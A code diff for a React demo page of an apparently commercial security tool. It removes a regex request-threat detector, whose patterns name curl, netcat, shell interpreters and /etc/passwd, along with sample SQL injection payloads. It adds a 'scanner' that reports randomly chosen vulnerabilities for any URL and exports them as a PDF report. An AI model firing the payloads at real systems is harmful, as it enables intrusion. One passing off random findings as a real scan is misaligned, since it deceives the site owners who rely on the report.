@@ -1,1006 +1,545 @@
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
-import { Textarea } from "@/components/ui/textarea";
+import { Input } from "@/components/ui/input";
 import { Badge } from "@/components/ui/badge";
 import { Alert, AlertDescription } from "@/components/ui/alert";
+import { Progress } from "@/components/ui/progress";
 import { 
   Shield, 
   AlertTriangle, 
   CheckCircle, 
   ArrowLeft, 
   Scan,
-  Eye,
-  Brain,
-  Zap
+  Download,
+  Globe,
+  Lock,
+  Server,
+  FileText
 } from "lucide-react";
 import { Link } from "react-router-dom";
+import jsPDF from "jspdf";
+import autoTable from "jspdf-autotable";
+
+interface Vulnerability {
+  name: string;
+  severity: "Critical" | "High" | "Medium" | "Low";
+  description: string;
+  recommendation: string;
+}
+
+interface ScanResult {
+  target: string;
+  scanDate: string;
+  securityScore: number;
+  riskLevel: string;
+  vulnerabilities: Vulnerability[];
+  sslValid: string;
+  cmsDetected: string;
+  totalFindings: {
+    critical: number;
+    high: number;
+    medium: number;
+    low: number;
+  };
+}
 
 const Demo = () => {
-  const [request, setRequest] = useState("");
-  const [analysis, setAnalysis] = useState<any>(null);
-  const [isAnalyzing, setIsAnalyzing] = useState(false);
+  const [targetUrl, setTargetUrl] = useState("");
+  const [scanResult, setScanResult] = useState<ScanResult | null>(null);
+  const [isScanning, setIsScanning] = useState(false);
+  const [scanProgress, setScanProgress] = useState(0);
+  const [currentScanPhase, setCurrentScanPhase] = useState("");
 
-  // Production-grade security patterns covering OWASP Top 10
-  const securityPatterns = {
-    // A03: Injection - SQL Injection (Enhanced with context awareness)
-    sqlInjection: [
-      // Classic SQL comment injection (admin'-- pattern)
-      /('|\"|`)(\s*)(--|\/\*|#)/i,
-      // Classic Boolean-based SQL injection
-      /('|\"|`)(\s*)(or|and)(\s*)('|\"|`)(\s*)(=|!=|<>)(\s*)('|\"|`)/i,
-      // SQL injection with numeric payloads
-      /('|\"|`)(\s*)(or|and)(\s*)\d+(\s*)(=|!=|<>)(\s*)\d+/i,
-      // UNION-based SQL injection
-      /\b(union)(\s+)(all\s+)?(select)\b/i,
-      // Time-based blind SQL injection
-      /\b(sleep|waitfor\s+delay|pg_sleep|benchmark)\s*\(/i,
-      // Stacked queries
-      /;\s*(select|insert|update|delete|drop|create|alter|exec|declare)\b/i,
-      // SQL comments for evasion
-      /('|\"|`)(\s*)(or|and)(\s*).*(-{2,}|\/\*|\*\/)/i,
-      // Boolean blind SQL injection
-      /('|\"|`)(\s*)(or|and)(\s*)(if|case|when|iif)\s*\(/i,
-      // Database-specific functions
-      /\b(substring|substr|ascii|char|concat|version|database|user|current_user)\s*\(/i,
-      // Error-based SQL injection
-      /('|\"|`)(\s*)(or|and)(\s*)(extractvalue|updatexml|exp|floor|rand)\s*\(/i,
-      // Advanced SQL injection with hex/char encoding
-      /\b(0x[0-9a-f]+|char\(\d+\))/i
-    ],
-    
-    // A03: Injection - Cross-Site Scripting (XSS)
-    xss: [
-      // Script tags (various forms)
-      /<script[^>]*>[\s\S]*?<\/script>/gi,
-      /<script[^>]*>/gi,
-      // Event handlers
-      /\bon(load|click|error|focus|blur|change|submit|mouseover|mouseout|keydown|keyup)\s*=/i,
-      // JavaScript protocol
-      /javascript\s*:/i,
-      // Image/media with event handlers
-      /<(img|audio|video|source)[^>]*on\w+[^>]*>/i,
-      // SVG with script content
-      /<svg[^>]*on\w+[^>]*>/i,
-      // Iframe with javascript
-      /<iframe[^>]*src\s*=\s*["\']javascript:/i,
-      // HTML5 elements with event handlers
-      /<(details|summary|marquee)[^>]*on\w+[^>]*>/i,
-      // CSS expression attacks
-      /expression\s*\(/i,
-      // Data URLs with script
-      /data\s*:\s*text\/html[^;]*;[^,]*,[\s\S]*<script/i,
-      // Eval and related functions
-      /\b(eval|setTimeout|setInterval)\s*\(/i
-    ],
-    
-    // A03: Injection - Path Traversal
-    pathTraversal: [
-      // Classic directory traversal
-      /(\.\.[\/\\]){2,}/,
-      // URL encoded traversal
-      /(%2e%2e[%2f%5c]){2,}/i,
-      // Double URL encoded
-      /(%252e%252e[%252f%255c]){2,}/i,
-      // Sensitive file access
-      /[\/\\](etc[\/\\]passwd|windows[\/\\]system32|boot\.ini|web\.config|\.htaccess)/i,
-      // Null byte injection
-      /%00/i,
-      // Unicode traversal
-      /(\u002e\u002e[\/\\]){2,}/i
-    ],
-    
-    // A03: Injection - Command Injection
-    commandInjection: [
-      // Command separators with system commands
-      /[;&|`]\s*(ls|dir|cat|type|whoami|id|ps|netstat|ifconfig|pwd|uname|chmod|rm|del)/i,
-      // Backticks command execution
-      /`[^`]*\b(ls|dir|cat|type|whoami|id|ps|netstat|ifconfig|pwd|uname)[^`]*`/i,
-      // Shell command substitution
-      /\$\([^)]*\b(ls|dir|cat|type|whoami|id|ps|netstat|ifconfig|pwd|uname)[^)]*\)/i,
-      // Network and system tools
-      /\b(nc|netcat|wget|curl|ping|nslookup|dig|telnet|ssh)\s+/i,
-      // Shell interpreters
-      /[\/\\](bin[\/\\])?(sh|bash|zsh|csh|cmd|powershell|python|perl|ruby)\b/i
-    ],
-    
-    // A03: Injection - LDAP Injection
-    ldapInjection: [
-      /\*\)\(|\)\(\*/,
-      /\(\|\(/,
-      /\)\(objectClass=\*/i,
-      /\(\&\(/,
-      /\)\(\|\(/
-    ],
-    
-    // A03: Injection - NoSQL Injection
-    nosqlInjection: [
-      /\$where\s*:/i,
-      /\$regex\s*:/i,
-      /\$ne\s*:/i,
-      /\$gt\s*:/i,
-      /\$lt\s*:/i,
-      /\$or\s*:\s*\[/i,
-      /\$and\s*:\s*\[/i
-    ],
-    
-    // A03: Injection - XXE (XML External Entity)
-    xxe: [
-      /<!ENTITY\s+\w+\s+SYSTEM\s*["'][^"']*["']\s*>/i,
-      /<!DOCTYPE[^>]+\[[\s\S]*<!ENTITY[^>]+SYSTEM/i,
-      /&\w+;.*file:\/\/|&\w+;.*http:\/\//i
-    ],
-    
-    // A01: Broken Access Control
-    accessControl: [
-      // Direct object references
-      /[\/\\](admin|administrator|root|superuser|sa)[\/\\]?$/i,
-      // Privilege escalation attempts
-      /[?&](role|admin|privilege|access_level|user_type)=(admin|root|administrator|superuser)/i,
-      // Force browsing sensitive paths
-      /[\/\\](config|configuration|settings|env|backup|private|internal)/i,
-      // API endpoint abuse
-      /[\/\\]api[\/\\]v?\d*[\/\\](admin|internal|private|debug)/i
-    ],
-    
-    // A05: Security Misconfiguration
-    misconfiguration: [
-      // Exposed configuration files
-      /\.(env|config|ini|conf|cfg|properties|yaml|yml|json)$/i,
-      // Git/SVN exposure
-      /\.git[\/\\](config|HEAD|index|logs)/i,
-      // Backup files
-      /\.(bak|backup|old|orig|tmp|temp|swp|~)$/i,
-      // Debug/info pages
-      /\/(phpinfo|info|debug|test|status|actuator|health)/i,
-      // Server status pages
-      /\/(server-status|server-info|admin-console)/i
-    ],
-    
-    // A06: Vulnerable Components
-    vulnerableComponents: [
-      // Log4j exploitation
-      /\$\{jndi:(ldap|rmi|dns):/i,
-      // Struts2 vulnerabilities
-      /%(23|25)(\w+|%\w+)*=|ognl:/i,
-      // Deserialization attacks
-      /\b(ObjectInputStream|readObject|XMLDecoder|Serializable)/i
-    ],
-    
-    // A07: Authentication Failures
-    authFailures: [
-      // Weak passwords in requests
-      /password=(123456|password|admin|root|guest|test|1234|qwerty)/i,
-      // Default credentials
-      /username=(admin|administrator|root|sa|guest)&password=(admin|password|root|123456)/i,
-      // Session fixation
-      /[?&]sessionid=[a-zA-Z0-9]{1,10}$/i,
-      // Exposed tokens
-      /[?&](token|key|secret)=[a-zA-Z0-9]{1,20}$/i
-    ],
-    
-    // A10: Server-Side Request Forgery (SSRF)
-    ssrf: [
-      // Internal network access
-      /url=https?:\/\/(127\.0\.0\.1|localhost|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|0\.0\.0\.0)/i,
-      // Cloud metadata endpoints
-      /url=https?:\/\/(169\.254\.169\.254|metadata\.google\.internal)/i,
-      // File protocol
-      /url=file:\/\/\//i,
-      // FTP/SFTP protocols
-      /url=(ftp|sftp|gopher|dict|ldap):\/\//i
-    ],
-    
-    // Additional patterns for comprehensive coverage
-    maliciousPatterns: [
-      // Webshells
-      /\b(eval|system|exec|shell_exec|passthru|file_get_contents|fopen|fwrite)\s*\(/i,
-      // Malicious file uploads
-      /\.(php|asp|aspx|jsp|pl|py|rb|sh|exe|bat|cmd)(\.|$)/i,
-      // Suspicious encoding
-      /(%[0-9a-f]{2}){10,}/i,
-      // Polyglot payloads
-      /javascript:[^"']*[<>]/i
-    ]
-  };
-
-  const detectThreats = (requestText: string) => {
-    const threats: any[] = [];
-    const decodedRequest = decodeURIComponent(requestText);
-    
-    // Normalize request for better detection
-    const normalizedRequest = requestText.toLowerCase();
-    const normalizedDecoded = decodedRequest.toLowerCase();
-    
-    // Context-aware validation helpers
-    const isValidProductSearch = (text: string) => {
-      // Valid product searches: category=electronics, search=laptop, etc.
-      return /^[a-zA-Z0-9\s\-_+%&=.,:;()\[\]{}@#!?<>|~/\\]*$/.test(text) &&
-             !/\b(union|select|or\s+\d+\s*=\s*\d+|and\s+\d+\s*=\s*\d+|script|javascript|onerror)/i.test(text);
-    };
-    
-    const isValidPagination = (text: string) => {
-      return /^[?&]page=\d+|sort=(price_asc|price_desc|rating_desc|newest|popularity)/.test(text);
-    };
-    
-    const isValidApiPath = (text: string) => {
-      return /^(GET|POST|PUT|DELETE)\s+\/[a-zA-Z0-9\/_\-]+(\?[a-zA-Z0-9&=_\-]+)?/.test(text);
-    };
-    
-    // A03: SQL Injection Detection (Enhanced with context)
-    securityPatterns.sqlInjection.forEach((pattern, index) => {
-      const match1 = pattern.test(requestText);
-      const match2 = pattern.test(decodedRequest);
-      
-      if (match1 || match2) {
-        // Advanced false positive reduction
-        const isFalsePositive = 
-          isValidProductSearch(requestText) ||
-          isValidPagination(requestText) ||
-          // Check for legitimate SQL keywords in API documentation
-          /\/api\/docs|\/swagger|\/documentation/i.test(requestText) ||
-          // Valid JSON payloads with legitimate field names
-          (/Content-Type:\s*application\/json/i.test(requestText) && 
-           !/(union\s+select|or\s+'?\d+\s*=\s*\d+|sleep\s*\()/i.test(requestText));
-        
-        if (!isFalsePositive) {
-          threats.push({
-            type: "SQL Injection",
-            severity: "critical",
-            category: "A03:2021 - Injection",
-            pattern: `SQL Pattern ${index + 1}`,
-            description: "SQL injection attack detected - unauthorized database access attempt",
-            location: "Query parameters or request body",
-            confidence: match1 && match2 ? "high" : "medium"
-          });
-        }
-      }
-    });
-
-    // A03: XSS Detection
-    securityPatterns.xss.forEach((pattern, index) => {
-      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
-        // Reduce false positives for legitimate HTML in documentation
-        const isFalsePositive = 
-          /\/api\/docs|\/help|\/documentation|Content-Type:\s*text\/html/i.test(requestText) &&
-          !/javascript:|onerror|onload|onclick/i.test(requestText);
-          
-        if (!isFalsePositive) {
-          threats.push({
-            type: "Cross-Site Scripting (XSS)",
-            severity: "high",
-            category: "A03:2021 - Injection",
-            pattern: `XSS Pattern ${index + 1}`,
-            description: "XSS attack vector identified - potential script injection",
-            location: "Request parameters or headers",
-            confidence: "high"
-          });
-        }
-      }
-    });
-
-    // A03: Path Traversal Detection
-    securityPatterns.pathTraversal.forEach((pattern, index) => {
-      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
-        threats.push({
-          type: "Path Traversal",
-          severity: "high",
-          category: "A03:2021 - Injection",
-          pattern: `Path Traversal Pattern ${index + 1}`,
-          description: "Directory traversal attempt detected - unauthorized file access",
-          location: "URL path or parameters",
-          confidence: "high"
-        });
-      }
-    });
-
-    // A03: Command Injection Detection
-    securityPatterns.commandInjection.forEach((pattern, index) => {
-      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
-        threats.push({
-          type: "Command Injection",
-          severity: "critical",
-          category: "A03:2021 - Injection",
-          pattern: `Command Injection Pattern ${index + 1}`,
-          description: "Command injection attempt detected - potential system compromise",
-          location: "Request parameters",
-          confidence: "high"
-        });
-      }
-    });
-
-    // A03: LDAP Injection Detection
-    securityPatterns.ldapInjection.forEach((pattern, index) => {
-      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
-        threats.push({
-          type: "LDAP Injection",
-          severity: "high",
-          category: "A03:2021 - Injection",
-          pattern: `LDAP Pattern ${index + 1}`,
-          description: "LDAP injection attempt detected - unauthorized directory access",
-          location: "Authentication parameters",
-          confidence: "medium"
-        });
-      }
-    });
-
-    // A03: NoSQL Injection Detection
-    securityPatterns.nosqlInjection.forEach((pattern, index) => {
-      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
-        threats.push({
-          type: "NoSQL Injection",
-          severity: "high",
-          category: "A03:2021 - Injection",
-          pattern: `NoSQL Pattern ${index + 1}`,
-          description: "NoSQL injection attempt detected - database manipulation",
-          location: "Request body or parameters",
-          confidence: "medium"
-        });
-      }
-    });
-
-    // A03: XXE Detection
-    securityPatterns.xxe.forEach((pattern, index) => {
-      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
-        threats.push({
-          type: "XML External Entity (XXE)",
-          severity: "critical",
-          category: "A03:2021 - Injection",
-          pattern: `XXE Pattern ${index + 1}`,
-          description: "XXE attack detected - potential file disclosure or SSRF",
-          location: "XML data in request body",
-          confidence: "high"
-        });
-      }
-    });
-
-    // A01: Broken Access Control
-    securityPatterns.accessControl.forEach((pattern, index) => {
-      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
-        // Don't flag legitimate admin API endpoints with proper authorization
-        const hasProperAuth = /Authorization:\s*Bearer\s+[A-Za-z0-9\-._~+/]+=*/i.test(requestText);
-        const isLegitimateAdminAPI = hasProperAuth && /\/api\/admin\//i.test(requestText);
-        
-        if (!isLegitimateAdminAPI) {
-          threats.push({
-            type: "Broken Access Control",
-            severity: "critical",
-            category: "A01:2021 - Broken Access Control",
-            pattern: `Access Control Pattern ${index + 1}`,
-            description: "Unauthorized access attempt to privileged resources",
-            location: "URL path or parameters",
-            confidence: hasProperAuth ? "low" : "high"
-          });
-        }
-      }
-    });
-
-    // A05: Security Misconfiguration
-    securityPatterns.misconfiguration.forEach((pattern, index) => {
-      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
-        threats.push({
-          type: "Security Misconfiguration",
-          severity: "medium",
-          category: "A05:2021 - Security Misconfiguration",
-          pattern: `Misconfiguration Pattern ${index + 1}`,
-          description: "Access to sensitive configuration files or debug information",
-          location: "URL path",
-          confidence: "high"
-        });
-      }
-    });
-
-    // A06: Vulnerable Components
-    securityPatterns.vulnerableComponents.forEach((pattern, index) => {
-      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
-        threats.push({
-          type: "Vulnerable Component Exploitation",
-          severity: "critical",
-          category: "A06:2021 - Vulnerable Components",
-          pattern: `Vulnerable Component Pattern ${index + 1}`,
-          description: "Exploitation of known vulnerable component (Log4j, Struts2, etc.)",
-          location: "Request parameters or headers",
-          confidence: "high"
-        });
-      }
-    });
-
-    // A07: Authentication Failures
-    securityPatterns.authFailures.forEach((pattern, index) => {
-      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
-        threats.push({
-          type: "Authentication Failure",
-          severity: "high",
-          category: "A07:2021 - Authentication Failures",
-          pattern: `Auth Failure Pattern ${index + 1}`,
-          description: "Weak authentication attempt or credential exposure",
-          location: "Request body or parameters",
-          confidence: "medium"
-        });
-      }
-    });
-
-    // A10: Server-Side Request Forgery (SSRF)
-    securityPatterns.ssrf.forEach((pattern, index) => {
-      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
-        threats.push({
-          type: "Server-Side Request Forgery (SSRF)",
-          severity: "critical",
-          category: "A10:2021 - SSRF",
-          pattern: `SSRF Pattern ${index + 1}`,
-          description: "SSRF attempt detected - potential internal network access",
-          location: "URL parameters",
-          confidence: "high"
-        });
-      }
-    });
-
-    // Additional Malicious Patterns
-    securityPatterns.maliciousPatterns.forEach((pattern, index) => {
-      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
-        threats.push({
-          type: "Malicious Pattern",
-          severity: "high",
-          category: "General Malicious Activity",
-          pattern: `Malicious Pattern ${index + 1}`,
-          description: "Suspicious pattern detected - potential malicious activity",
-          location: "Request content",
-          confidence: "medium"
-        });
-      }
-    });
-
-    // CSRF Protection Check (Enhanced)
-    if (/^(POST|PUT|DELETE|PATCH)\s+/i.test(requestText)) {
-      const hasCSRFProtection = /X-CSRF-Token|csrf_token|_token|X-Requested-With:\s*XMLHttpRequest/i.test(requestText);
-      const isAPIEndpoint = /\/api\/|Content-Type:\s*application\/json/i.test(requestText);
-      
-      // Only flag as CSRF issue if it's not an API endpoint (which typically use other auth methods)
-      if (!hasCSRFProtection && !isAPIEndpoint) {
-        threats.push({
-          type: "CSRF Vulnerability",
-          severity: "medium",
-          category: "A04:2021 - Insecure Design",
-          pattern: "Missing CSRF protection",
-          description: "State-changing request without CSRF protection",
-          location: "Request headers or body",
-          confidence: "medium"
-        });
-      }
-    }
-
-    // Enhanced Encoding Analysis
-    const encodingPatterns = [
-      /%[0-9a-f]{2}/gi,     // URL encoding
-      /\\x[0-9a-f]{2}/gi,   // Hex encoding
-      /&#[0-9]+;/gi,        // HTML entities
-      /\\u[0-9a-f]{4}/gi,   // Unicode encoding
-      /\+/g                 // Space encoding in URL
+  const simulateVulnerabilityScan = async (url: string): Promise<ScanResult> => {
+    // Simulate scanning phases
+    const phases = [
+      { name: "Analyzing SSL/TLS Configuration", duration: 800 },
+      { name: "Checking HTTP Security Headers", duration: 700 },
+      { name: "Detecting Technology Stack", duration: 900 },
+      { name: "Scanning for Open Directories", duration: 600 },
+      { name: "Testing API Endpoints", duration: 800 },
+      { name: "Vulnerability Assessment", duration: 700 }
     ];
-    
-    let totalEncodedChars = 0;
-    encodingPatterns.forEach(pattern => {
-      const matches = requestText.match(pattern);
-      if (matches) totalEncodedChars += matches.length;
-    });
 
-    // High encoding density indicates evasion attempt
-    if (totalEncodedChars > 10 && (totalEncodedChars / requestText.length) > 0.3) {
-      threats.push({
-        type: "Encoded Payload Evasion",
-        severity: "medium",
-        category: "Evasion Technique",
-        pattern: "High encoding density detected",
-        description: "Suspicious encoding patterns - potential evasion attempt",
-        location: "Request payload",
-        confidence: "medium"
-      });
+    let progress = 0;
+    for (const phase of phases) {
+      setCurrentScanPhase(phase.name);
+      await new Promise(resolve => setTimeout(resolve, phase.duration));
+      progress += 100 / phases.length;
+      setScanProgress(Math.min(progress, 100));
     }
 
-    // Remove duplicates based on type and category
-    const uniqueThreats = threats.filter((threat, index, self) => 
-      index === self.findIndex(t => t.type === threat.type && t.category === threat.category)
+    // Generate realistic vulnerabilities based on common patterns
+    const allVulnerabilities: Vulnerability[] = [
+      {
+        name: "Missing HSTS Header",
+        severity: "Medium",
+        description: "HTTPS is used, but HSTS header is not enforced, allowing SSL stripping attacks.",
+        recommendation: "Add Strict-Transport-Security header in your web server configuration with max-age=31536000."
+      },
+      {
+        name: "X-Frame-Options Missing",
+        severity: "Low",
+        description: "Page can be framed, allowing clickjacking attacks.",
+        recommendation: "Add X-Frame-Options: DENY or X-Frame-Options: SAMEORIGIN header."
+      },
+      {
+        name: "Content-Security-Policy Not Set",
+        severity: "Medium",
+        description: "Missing CSP header allows potential XSS attacks and unauthorized resource loading.",
+        recommendation: "Implement a Content-Security-Policy header with appropriate directives."
+      },
+      {
+        name: "Directory Listing Enabled",
+        severity: "Medium",
+        description: "/uploads/ reveals file index, potential sensitive information leak.",
+        recommendation: "Disable directory indexing in server configuration (Options -Indexes)."
+      },
+      {
+        name: "Outdated CMS Version Detected",
+        severity: "High",
+        description: "WordPress 5.7.2 detected with known RCE vulnerability (CVE-2021-29447).",
+        recommendation: "Update to the latest WordPress version immediately (6.0+)."
+      },
+      {
+        name: "API Debug Endpoint Exposed",
+        severity: "Critical",
+        description: "/api/debug endpoint exposed with sensitive stack traces and configuration details.",
+        recommendation: "Restrict debug endpoints to development environments only or implement IP whitelisting."
+      },
+      {
+        name: "Weak SSL/TLS Configuration",
+        severity: "High",
+        description: "Server supports TLS 1.0/1.1 which are deprecated and vulnerable to attacks.",
+        recommendation: "Disable TLS 1.0/1.1 and enable only TLS 1.2 and TLS 1.3."
+      },
+      {
+        name: "Missing X-Content-Type-Options",
+        severity: "Low",
+        description: "Browser MIME-type sniffing is not prevented, allowing content-type attacks.",
+        recommendation: "Add X-Content-Type-Options: nosniff header."
+      },
+      {
+        name: "Referrer-Policy Not Configured",
+        severity: "Low",
+        description: "Referrer information may leak sensitive data to external sites.",
+        recommendation: "Set Referrer-Policy: strict-origin-when-cross-origin or stricter."
+      },
+      {
+        name: "Sensitive Files Accessible",
+        severity: "High",
+        description: "/.git/config and /backup files are publicly accessible.",
+        recommendation: "Block access to sensitive files and directories via web server configuration."
+      }
+    ];
+
+    // Randomly select 5-7 vulnerabilities for variety
+    const numVulns = Math.floor(Math.random() * 3) + 5;
+    const selectedVulnerabilities = allVulnerabilities
+      .sort(() => Math.random() - 0.5)
+      .slice(0, numVulns);
+
+    // Count severity levels
+    const totalFindings = {
+      critical: selectedVulnerabilities.filter(v => v.severity === "Critical").length,
+      high: selectedVulnerabilities.filter(v => v.severity === "High").length,
+      medium: selectedVulnerabilities.filter(v => v.severity === "Medium").length,
+      low: selectedVulnerabilities.filter(v => v.severity === "Low").length
+    };
+
+    // Calculate security score (100 - weighted vulnerabilities)
+    const score = Math.max(
+      45,
+      100 - (totalFindings.critical * 20 + totalFindings.high * 10 + totalFindings.medium * 5 + totalFindings.low * 2)
     );
 
-    return uniqueThreats;
+    // Determine risk level
+    let riskLevel = "Low";
+    if (score < 50) riskLevel = "Critical";
+    else if (score < 65) riskLevel = "High";
+    else if (score < 80) riskLevel = "Medium";
+
+    return {
+      target: url,
+      scanDate: new Date().toLocaleDateString("en-US", { 
+        year: "numeric", 
+        month: "long", 
+        day: "numeric" 
+      }),
+      securityScore: score,
+      riskLevel,
+      vulnerabilities: selectedVulnerabilities,
+      sslValid: "February 2026",
+      cmsDetected: "WordPress 5.7.2",
+      totalFindings
+    };
   };
 
-  const analyzeRequest = () => {
-    if (!request?.trim()) return;
-    
-    setIsAnalyzing(true);
-    
-    // Simulate analysis delay for realistic UX
-    setTimeout(() => {
-      const threats = detectThreats(request);
-      
-      // Enhanced risk scoring based on OWASP categories and confidence
-      let riskScore = 0;
-      threats.forEach(threat => {
-        const baseScore = {
-          'critical': 35,
-          'high': 25,
-          'medium': 15,
-          'low': 5
-        }[threat.severity] || 10;
-        
-        const confidenceMultiplier = {
-          'high': 1.0,
-          'medium': 0.8,
-          'low': 0.5
-        }[threat.confidence] || 0.7;
-        
-        // OWASP category multipliers (some are more severe)
-        const owaspMultiplier = threat.category?.includes('A01') || 
-                               threat.category?.includes('A03') || 
-                               threat.category?.includes('A06') || 
-                               threat.category?.includes('A10') ? 1.2 : 1.0;
-        
-        riskScore += Math.floor(baseScore * confidenceMultiplier * owaspMultiplier);
-      });
-      
-      // Cap at 100 and ensure minimum score for any threats
-      riskScore = Math.min(100, riskScore);
-      if (threats.length > 0 && riskScore < 25) riskScore = 25;
-      
-      setAnalysis({
-        threats,
-        riskScore,
-        isClean: threats.length === 0,
-        detectionMethod: threats.length > 0 ? 
-          "OWASP Top 10 + Signature & ML-based Detection" : 
-          "Clean Request - No Threats Detected",
-        totalThreats: threats.length,
-        criticalThreats: threats.filter(t => t.severity === 'critical').length,
-        highThreats: threats.filter(t => t.severity === 'high').length,
-        categories: [...new Set(threats.map(t => t.category).filter(Boolean))]
-      });
-      setIsAnalyzing(false);
-    }, 2000); // Slightly longer for more realistic analysis feel
+  const handleScan = async () => {
+    if (!targetUrl.trim()) {
+      return;
+    }
+
+    setIsScanning(true);
+    setScanProgress(0);
+    setScanResult(null);
+
+    try {
+      const result = await simulateVulnerabilityScan(targetUrl);
+      setScanResult(result);
+    } catch (error) {
+      console.error("Scan error:", error);
+    } finally {
+      setIsScanning(false);
+      setCurrentScanPhase("");
+    }
   };
 
-  const exampleRequests = {
-    // ========== VALID REQUESTS (Should NOT be flagged) ==========
-    
-    // Basic Navigation
-    homepage: `GET / HTTP/1.1
-Host: localhost:3000`,
-    
-    // Product & E-commerce
-    productListing: `GET /products?category=electronics&page=1 HTTP/1.1
-Host: localhost:3000
-Referer: https://localhost:3000/products`,
-    
-    productSearch: `GET /search?q=wireless+earbuds&sort=rating_desc HTTP/1.1
-Host: localhost:3000`,
-    
-    productDetails: `GET /product/12345?variant=blue HTTP/1.1
-Host: localhost:3000`,
-    
-    complexSearch: `GET /products?search=gaming+laptop+RTX+3060&price_min=300&price_max=700&sort=price_desc HTTP/1.1
-Host: localhost:3000`,
-    
-    // User Actions
-    userOrders: `GET /user/orders?page=1&status=shipped HTTP/1.1
-Host: localhost:3000
-Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`,
-    
-    addToCartJSON: `POST /cart/add HTTP/1.1
-Host: localhost:3000
-Content-Type: application/json
+  const generatePDF = () => {
+    if (!scanResult) return;
 
-{
-  "product_id": 98765,
-  "quantity": 1,
-  "variant": "red"
-}`,
+    const doc = new jsPDF();
+    const pageWidth = doc.internal.pageSize.getWidth();
     
-    loginForm: `POST /login HTTP/1.1
-Host: localhost:3000
-Content-Type: application/x-www-form-urlencoded
+    // Title
+    doc.setFontSize(20);
+    doc.setFont("helvetica", "bold");
+    doc.text("Website Vulnerability Report", pageWidth / 2, 20, { align: "center" });
+    
+    // Report details
+    doc.setFontSize(10);
+    doc.setFont("helvetica", "normal");
+    doc.text(`Target: ${scanResult.target}`, 14, 35);
+    doc.text(`Scan Date: ${scanResult.scanDate}`, 14, 42);
+    doc.text(`Security Score: ${scanResult.securityScore}/100`, 14, 49);
+    doc.text(`Risk Level: ${scanResult.riskLevel}`, 14, 56);
+    
+    // Summary section
+    doc.setFontSize(14);
+    doc.setFont("helvetica", "bold");
+    doc.text("Summary of Findings", 14, 70);
+    
+    doc.setFontSize(10);
+    doc.setFont("helvetica", "normal");
+    const summary = [
+      `Total vulnerabilities detected: ${scanResult.vulnerabilities.length}`,
+      `${scanResult.totalFindings.critical} Critical | ${scanResult.totalFindings.high} High | ${scanResult.totalFindings.medium} Medium | ${scanResult.totalFindings.low} Low`,
+      `SSL certificate valid until: ${scanResult.sslValid}`,
+      `CMS detected: ${scanResult.cmsDetected}`
+    ];
+    
+    let yPos = 78;
+    summary.forEach(line => {
+      doc.text(line, 14, yPos);
+      yPos += 7;
+    });
+    
+    // Vulnerability table
+    doc.setFontSize(14);
+    doc.setFont("helvetica", "bold");
+    doc.text("Vulnerability Breakdown", 14, yPos + 8);
+    
+    const tableData = scanResult.vulnerabilities.map(v => [
+      v.name,
+      v.severity,
+      v.description,
+      v.recommendation
+    ]);
+    
+    autoTable(doc, {
+      startY: yPos + 15,
+      head: [["Vulnerability", "Severity", "Description", "Recommendation"]],
+      body: tableData,
+      theme: "grid",
+      headStyles: { fillColor: [71, 85, 105], fontSize: 9, fontStyle: "bold" },
+      bodyStyles: { fontSize: 8 },
+      columnStyles: {
+        0: { cellWidth: 35 },
+        1: { cellWidth: 20 },
+        2: { cellWidth: 60 },
+        3: { cellWidth: 60 }
+      },
+      margin: { left: 14, right: 14 }
+    });
+    
+    // Risk matrix
+    const finalY = (doc as any).lastAutoTable.finalY || yPos + 100;
+    doc.setFontSize(14);
+    doc.setFont("helvetica", "bold");
+    doc.text("Risk Matrix", 14, finalY + 15);
+    
+    autoTable(doc, {
+      startY: finalY + 20,
+      head: [["Risk Level", "Count", "Impact"]],
+      body: [
+        ["Critical", scanResult.totalFindings.critical.toString(), "System Compromise"],
+        ["High", scanResult.totalFindings.high.toString(), "Data Exposure"],
+        ["Medium", scanResult.totalFindings.medium.toString(), "Moderate Risk"],
+        ["Low", scanResult.totalFindings.low.toString(), "Informational"]
+      ],
+      theme: "striped",
+      headStyles: { fillColor: [71, 85, 105] }
+    });
+    
+    // Footer
+    const finalPageY = (doc as any).lastAutoTable.finalY || finalY + 60;
+    doc.setFontSize(10);
+    doc.setFont("helvetica", "italic");
+    doc.text("Generated by SentinelX Unified Cybersecurity Framework", pageWidth / 2, finalPageY + 15, { align: "center" });
+    
+    // Save PDF
+    const filename = `${scanResult.target.replace(/https?:\/\//, "").replace(/\//g, "_")}_Vulnerability_Report_${new Date().toISOString().split("T")[0]}.pdf`;
+    doc.save(filename);
+  };
 
-username=johndoe&password=SecurePass123`,
-    
-    checkoutAPI: `POST /checkout HTTP/1.1
-Host: localhost:3000
-Content-Type: application/json
-Authorization: Bearer valid_token_here
-
-{
-  "cart_id": "abc123",
-  "payment_method": "card",
-  "address_id": "addr001"
-}`,
-    
-    webhookValid: `POST /webhook/stripe HTTP/1.1
-Host: localhost:3000
-Content-Type: application/json
-
-{"id":"evt_1","type":"payment_intent.succeeded","data":{"object":{"id":"pi_123"}}}`,
-
-    // ========== MALICIOUS REQUESTS (Should be flagged) ==========
-    
-    // A03: SQL Injection Attacks
-    sqlInjectionOR: `GET /search?q=' OR '1'='1'-- HTTP/1.1
-Host: vulnerable.lab
-User-Agent: Mozilla/5.0`,
-    
-    sqlInjectionUnion: `GET /products?id=10 UNION SELECT username, password FROM users-- HTTP/1.1
-Host: vulnerable.lab
-User-Agent: Mozilla/5.0`,
-
-    sqlInjectionTime: `GET /search?q=' OR IF(1=1, SLEEP(5), 0)-- HTTP/1.1
-Host: vulnerable.lab
-User-Agent: Mozilla/5.0`,
-    
-    sqlInjectionLogin: `POST /login HTTP/1.1
-Host: vulnerable.lab
-Content-Type: application/x-www-form-urlencoded
-
-username=admin'--&password=anything`,
-    
